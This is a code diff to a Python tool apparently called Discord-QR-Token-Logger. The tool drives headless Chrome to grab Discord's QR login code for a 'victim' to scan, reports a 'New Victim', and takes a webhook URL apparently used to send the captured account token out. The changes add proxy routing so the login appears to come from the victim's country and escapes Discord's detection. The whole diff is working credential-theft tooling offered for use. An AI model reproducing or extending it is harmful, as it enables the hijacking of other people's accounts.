@@ -9,9 +9,7 @@ The actual repository is unlicensed, it mean all rights are reserved. You cannot
 Violating this rule may lead our intervention according to the Github Terms of Service — User-Generated Content — Section D.3 using the Content Removal Policies — DMCA Takedown Policy.
 CREDITS
 Lemon.-_-.#3714
-Luci (9P9)
 the-cult-of-integral
-mte0
 """
 
 import base64
@@ -19,6 +17,7 @@ import ctypes
 import os
 import time
 import win32clipboard
+import requests
 from io import BytesIO
 from tempfile import NamedTemporaryFile, TemporaryDirectory
 from threading import Thread, Event
@@ -28,7 +27,6 @@ from pystray import Icon, Menu, MenuItem
 from pystyle import Box, Center, Colorate, Colors, System, Write
 from selenium import webdriver
 from selenium.common.exceptions import WebDriverException
-from selenium.webdriver.chrome.service import Service
 from constants import BANNER, PYSTRAY_IMG
 from discord_token import QRGrabber, TokenInfo
 from exceptions import InvalidToken, QRCodeNotFound, WebhookSendFailure
@@ -37,22 +35,53 @@ from signal import SIGTERM
 
 
 def main(webhook_url: str) -> None:
-    Write.Print('\n\n[!] Generating QR code...', Colors.red_to_purple)
+    proxy_value = Write.Input("\n[*] Does the victim live in the same country as you otherwise use a proxy [IP:PORT] -> ", Colors.green_to_cyan, interval=0.01)
     opts = webdriver.ChromeOptions()
     opts.add_argument('--headless')
+    opts.add_argument('--silent')
+    opts.add_argument('start-maximized')
+    opts.add_argument('--disable-extensions')
+    opts.add_argument('--disable-gpu')
+    opts.add_argument('--disable-dev-shm-usage')
+    opts.add_argument('disable-infobars')
+    opts.add_argument('--disable-browser-side-navigation')
+    opts.add_argument('--disable-default-apps')
     opts.add_experimental_option('detach', True)
     opts.add_experimental_option('excludeSwitches', ['enable-logging'])
-    opts.add_argument('--log-level 3')
-    from webdriver_manager.chrome import ChromeDriverManager
-    os.environ['WDM_PROGRESS_BAR'] = str(0)
-    os.environ['WDM_LOG_LEVEL'] = '0'
+    if proxy_value:
+        proxies_http = {
+            "http": f"http://{proxy_value}",
+            "https": f"http://{proxy_value}",
+        }
+        proxies_https = {
+            "http": f"https://{proxy_value}",
+            "https": f"https://{proxy_value}",
+        }
+        try:
+            ip_info = requests.get('http://ip-api.com/json', proxies=proxies_http).json()
+        except requests.exceptions.RequestException:
+            try:
+                ip_info = requests.get('http://ip-api.com/json', proxies=proxies_https).json()
+            except requests.exceptions.RequestException as e:    
+                raise SystemExit(Write.Print(f'\n[^] Critical error when using the proxy server !\n\nThe script returning :\n\n{e}', Colors.yellow_to_green))
+        if ip_info['query'] == proxy_value.split(':')[0]: 
+            Write.Print(f"\n[!] Proxy server detected in {ip_info['country']}, establishing connection...", Colors.red_to_purple)
+            opts.add_argument(f'--proxy-server={proxy_value}')
+        else:
+            raise SystemExit(Write.Print(f'\n[^] Proxy server not working, or being detected by Discord.', Colors.yellow_to_green))
+    Write.Print('\n\n[!] Generating QR code...', Colors.red_to_purple)
+    # This module have conflicts with PyStyle; importing here prevents the issue.
     try:
-        main.driver = webdriver.Chrome(
-            service=Service(ChromeDriverManager().install()),
-            options=opts)
-    except WebDriverException:
-        raise SystemExit(
-            'WebDriverException : have you tried installing the latest version of Google Chrome?')
+        main.driver = webdriver.Chrome(options=opts)
+    except:
+        from webdriver_manager.chrome import ChromeDriverManager
+        from selenium.webdriver.chrome.service import Service
+        os.environ['WDM_PROGRESS_BAR'] = str(0)
+        os.environ['WDM_LOG_LEVEL'] = '0'
+        try:
+            main.driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
+        except WebDriverException as e:
+            raise SystemExit(Write.Print(f'\n\n[!] WebDriverException occured ! The script returned :\n\n{e}', Colors.yellow_to_green))
     main.driver.implicitly_wait(5)
     main.driver.get('https://discord.com/login')
     time.sleep(5)
@@ -61,8 +90,11 @@ def main(webhook_url: str) -> None:
     try:
         qr_code = qrg.get_qr_from_source(source)
     except QRCodeNotFound as e:
-        main.driver.service.process.send_signal(SIGTERM)
-        raise SystemExit(e)
+        try:
+            main.driver.service.process.send_signal(SIGTERM)
+        except:
+            pass
+        raise SystemExit(Write.Print(f'\n\n[^] QrCodeException occured ! The script returned :\n\n{e}', Colors.yellow_to_green))
     discord_login = main.driver.current_url
     with TemporaryDirectory(dir='.') as td:
         with NamedTemporaryFile(dir=td, suffix='.png') as tp1:
@@ -129,7 +161,7 @@ def main(webhook_url: str) -> None:
         pystray_icon.icon.notify("The Qr-Code has expired !", 'Exiting...')
         time.sleep(3)
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
-        raise SystemExit(Write.Print('\n\n[!] The Qr-Code have expired, exiting...', Colors.yellow_to_green))
+        raise SystemExit(Write.Print('\n\n[^] The Qr-Code have expired, exiting...', Colors.yellow_to_green))
     pystray_icon.icon.notify("The target scanned the QR-code sucessfuly.", 'New Victim !')
     time.sleep(3)
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
@@ -161,7 +193,7 @@ if __name__ == "__main__":
                     main.driver.service.process.send_signal(SIGTERM)
                 except:
                     pass
-                raise SystemExit
+                os._exit(0)
 
         pystray_icon.icon = Icon('QR_DTG', Image.open(BytesIO(base64.b64decode(PYSTRAY_IMG))), menu=Menu(
             MenuItem('Show', window_state),
@@ -169,11 +201,11 @@ if __name__ == "__main__":
             MenuItem('Quit', window_state)
         ))
         pystray_icon.icon.run()
-    System.Title('QR DISCORD LOGIN - By Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0')
+    System.Title('QR DISCORD LOGIN - By Lemon.-_-.#3714, the-cult-of-integral')
     System.Size(140, 35)
     print(Colorate.Horizontal(Colors.cyan_to_green, Center.XCenter(BANNER), 1))
     print(Colorate.Horizontal(Colors.rainbow, Center.GroupAlign(Box.DoubleCube(
-        "By Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0")), 1))
+        "By Lemon.-_-.#3714, the-cult-of-integral")), 1))
     print(Colorate.Horizontal(Colors.rainbow, Box.Lines(
         "https://github.com/9P9/Discord-QR-Token-Logger").replace('ቐ', "$"), 1), "\n")
     confir = Write.Input(
@@ -192,7 +224,7 @@ if __name__ == "__main__":
         th_main = Thread(target=main, args=(None,))
     else:
         raise SystemExit(Write.Print(
-        'Failed to recognise an input of either \'y\' or \'n\'.',
+        '[!] Failed to recognise an input of either \'y\' or \'n\'.',
         Colors.yellow_to_green))
     Thread(target=pystray_icon).start()
     th_main.start()
